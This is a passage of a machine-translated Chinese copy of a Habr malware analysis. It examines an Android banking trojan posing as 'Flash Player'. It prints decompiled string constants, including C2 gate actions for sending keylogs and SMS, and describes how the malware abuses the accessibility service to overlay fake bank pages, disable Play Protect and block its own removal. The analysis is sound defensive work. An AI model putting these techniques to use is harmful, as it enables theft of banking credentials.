class="hljs-keyword"><span class="hljs-keyword">final</span></span> String f5F = mo1a(<span class="hljs-string"><span class="hljs-string">"wtxndsosbhnaYzZjNzhhYzA2MDMyMTBkOA=="</span></span>); <span class="hljs-comment"><span class="hljs-comment">/* renamed from: G */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String f6G = mo1a(<span class="hljs-string"><span class="hljs-string">"nmibahlxjjsxM2IzNjY4NGUyZDIzYmYwZGVi"</span></span>); <span class="hljs-comment"><span class="hljs-comment">/* renamed from: H */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String f7H = mo1a(<span class="hljs-string"><span class="hljs-string">"vvgipgmxvxloN2NmZDdlNTkyNjRhYWVlMzkzZGIzMGFiYTUzM2E5"</span></span>); <span class="hljs-comment"><span class="hljs-comment">/* renamed from: I */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String f8I = mo1a(<span class="hljs-string"><span class="hljs-string">"zuqkhqhqsrvgMDczYWRkZmYyOTE5NmVmMzk2Yzc="</span></span>);</code> </pre> <br><br> 我编写了一个脚本，将这些行转换为正常格式，这帮助我度过了一段时间。 <br><br><pre> <code class="java hljs"> <span class="hljs-comment"><span class="hljs-comment">/* renamed from: A */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String str_statMails = <span class="hljs-string"><span class="hljs-string">"statMails"</span></span>; <span class="hljs-comment"><span class="hljs-comment">/* renamed from: B */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String str_activeDevice = <span class="hljs-string"><span class="hljs-string">"activeDevice"</span></span>; <span class="hljs-comment"><span class="hljs-comment">/* renamed from: C */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String str_timeWorking = <span class="hljs-string"><span class="hljs-string">"timeWorking"</span></span>; <span class="hljs-comment"><span class="hljs-comment">/* renamed from: D */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String str_statDownloadModule = <span class="hljs-string"><span class="hljs-string">"statDownloadModule"</span></span>; <span class="hljs-comment"><span class="hljs-comment">/* renamed from: E */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String str_lockDevice = <span class="hljs-string"><span class="hljs-string">"lockDevice"</span></span>; <span class="hljs-comment"><span class="hljs-comment">/* renamed from: F */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String str_offSound = <span class="hljs-string"><span class="hljs-string">"offSound"</span></span>; <span class="hljs-comment"><span class="hljs-comment">/* renamed from: G */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String str_keylogger = <span class="hljs-string"><span class="hljs-string">"keylogger"</span></span>; <span class="hljs-comment"><span class="hljs-comment">/* renamed from: H */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String str_activeInjection = <span class="hljs-string"><span class="hljs-string">"activeInjection"</span></span>; <span class="hljs-comment"><span class="hljs-comment">/* renamed from: I */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String str_timeInject = <span class="hljs-string"><span class="hljs-string">"timeInject"</span></span>;</code> </pre> <br> 我们还看到了存储在此类中的内容： <br><br><pre> <code class="java hljs"> <span class="hljs-comment"><span class="hljs-comment">/* renamed from: ay */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String str_url = <span class="hljs-string"><span class="hljs-string">"https://twitter.com/LukasStefanko"</span></span>; <span class="hljs-comment"><span class="hljs-comment">/* renamed from: az */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String str_Accessibility = <span class="hljs-string"><span class="hljs-string">"Flash Player Service"</span></span>; <span class="hljs-comment"><span class="hljs-comment">/* renamed from: bb */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String str_gate1 = <span class="hljs-string"><span class="hljs-string">"action=registration&amp;data="</span></span>; <span class="hljs-comment"><span class="hljs-comment">/* renamed from: bc */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String str_gate2 = <span class="hljs-string"><span class="hljs-string">"action=sendInjectLogs&amp;data="</span></span>; <span class="hljs-comment"><span class="hljs-comment">/* renamed from: bd */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String str_gate3 = <span class="hljs-string"><span class="hljs-string">"action=sendSmsLogs&amp;data="</span></span>; <span class="hljs-comment"><span class="hljs-comment">/* renamed from: be */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String str_gate4 = <span class="hljs-string"><span class="hljs-string">"action=timeInject&amp;data="</span></span>; <span class="hljs-comment"><span class="hljs-comment">/* renamed from: bf */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String str_gate5 = <span class="hljs-string"><span class="hljs-string">"action=sendKeylogger&amp;data="</span></span>; <span class="hljs-comment"><span class="hljs-comment">/* renamed from: bg */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String str_gate6 = <span class="hljs-string"><span class="hljs-string">"action=getModule&amp;data="</span></span>; <span class="hljs-comment"><span class="hljs-comment">/* renamed from: bh */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String str_gate7 = <span class="hljs-string"><span class="hljs-string">"action=checkap&amp;data="</span></span>; <span class="hljs-comment"><span class="hljs-comment">/* renamed from: bj */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String str_country = <span class="hljs-string"><span class="hljs-string">"[ua][ru][by][tj][uz][tm][az][am][kz][kg][md]"</span></span>;</code> </pre> <br><br> 卢卡斯·斯特凡科（Lukas Stefanko）的Twitter帐户（@LukasStefanko）列在服务器URL上，显然作者想开玩笑或对卢卡斯（这是NOD32的分析师）说些话，名称Accessibility Service +也存储在清单清单android中：label =“ Flash Player服务”，以及恶意软件无法使用的国家/地区列表。 <br><br><h2> 其余的 </h2><br> 简要介绍注射剂的工作。 如果启用了“无障碍服务”，则该服务的实现非常简单，该服务仅捕获启动银行应用程序的事件并在银行的活动之上启动其活动，该服务具有一个WebView对象，该对象下载银行的html-fake，然后使用JavaScript接收数据并将其发送到Malvari服务器。 <br><br> 此服务中还实现了Keylogger，阻止了恶意软件的删除并自动单击确认。 在com.miui.securitycenter应用程序中检测到安全断开连接交互。 此应用程序称为“安全性”，用于小米设备，其主要任务是监视敏感数据的安全性。 还发现了使用autoclick方法自动关闭“ Google Play保护”的代码。 <br><br><h2> 让我们继续练习 </h2><br> 我设法找到了恶棍推特，并获得了管理面板的屏幕截图 <br><br><img src="https://habrastorage.org/getpro/habr/post_images/ff3/d9e/c29/ff3d9ec29b0ab525130052b32a9d2a10.png" alt="图片"><br><br> 将apk软件包安装在具有API 27的仿真器上。 <br><br> 桌面上出现了一个名为“ Flash Player”的Flash Player图标。 <br><br><div class="spoiler">  <b class="spoiler_title">屏幕截图</b> <div class="spoiler_text"><img src="https://habrastorage.org/getpro/habr/post_images/ff2/516/805/ff25168051a4d17b8b22b15daac7244a.png" alt="图片"><br></div></div><br> 我们正在等待图标，我们已经启动了恶意软件。 <br><br> 启动Malvari后，活动会自动以启用无障碍服务的要求开始，如果将其最小化，它将再次出现，并且会循环出现，直到我打开该服务为止。 <br><br><div class="spoiler">  <b class="spoiler_title">屏幕截图</b> <div class="spoiler_text"><img src="https://habrastorage.org/getpro/habr/post_images/9c9/cbd/98c/9c9cbd98c2afaf3750d131a5003e9c9e.png" alt="图片"><img src="https://habrastorage.org/getpro/habr/post_images/e1d/9c1/48e/e1d9c148e24105b8db66848ae777fd79.png" alt="图片"><br></div></div><br> 启用“无障碍服务”复选框后，执行了从设置到桌面的自动转换，我再也无法进入“无障碍服务”设置，桌面图标也消失了，在出现“打ze模式关闭”请求几秒钟后，由于自动单击特殊功能，它自动关闭了。 <br><br><div class="spoiler">  <b class="spoiler_title">屏幕截图</b> <div class="spoiler_text"><img src="https://habrastorage.org/getpro/habr/post_images/d57/1b2/841/d571b28415c001fa433e5c171aecb2a1.png" alt="图片"><br></div></div><br> 接下来以相同的方式自动确认管理员权限。 无法手动删除该恶意软件，因为在打开此应用程序的设置时，它会自动退出（GLOBAL_ACTION_BACK）。 <br><br> 实际上，这都是第一部分中的全部内容，我很快将在第二部分中加上此Bot的主要模块（可能还有该模块的主要模块），因为我找不到带有有效链接到服务器的恶意软件的apk文件。 <br><br>  Malvari反向与<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=" class="user_link">keklick1337</a>结合<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=" class="user_link">实现</a> </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/zh-CN459858/">https://habr.com/ru/post/zh-CN459858/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../zh-CN459840/index.html">Xamarin.Forms的XAML Hot Reload发布</a></li>
<li><a href="../zh-CN459842/index.html">卢克索</a></li>
<li><a href="../zh-CN459844/index.html">窗口中的企鹅：WSL2的潜力和前景</a></li>
<li><a href="../zh-CN459850/index.html">业余无线电技术：我如何下令在中国工厂安装印刷电路板</a></li>
<li><a href="../zh-CN459852/index.html">在银行的移动应用程序中使用彩票库的做法</a></li>
<li><a href="../zh-CN459860/index.html">在gitlab-ci中配置ClickHouse进行集成测试</a></li>
<li><a href="../zh-CN459862/index.html">Berkeley DB STL接口</a></li>
<li><a href="../zh-CN459866/index.html">使用pwnable.kr 02解决问题-冲突。 哈希冲突</a></li>
<li><a href="../zh-CN459870/index.html">F＃中的示例模型-视图-更新体系结构</a></li>
<li><a href="../zh-CN459872/index.html">巴顿杰夫。 自定义故事。 敏捷软件开发的艺术</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>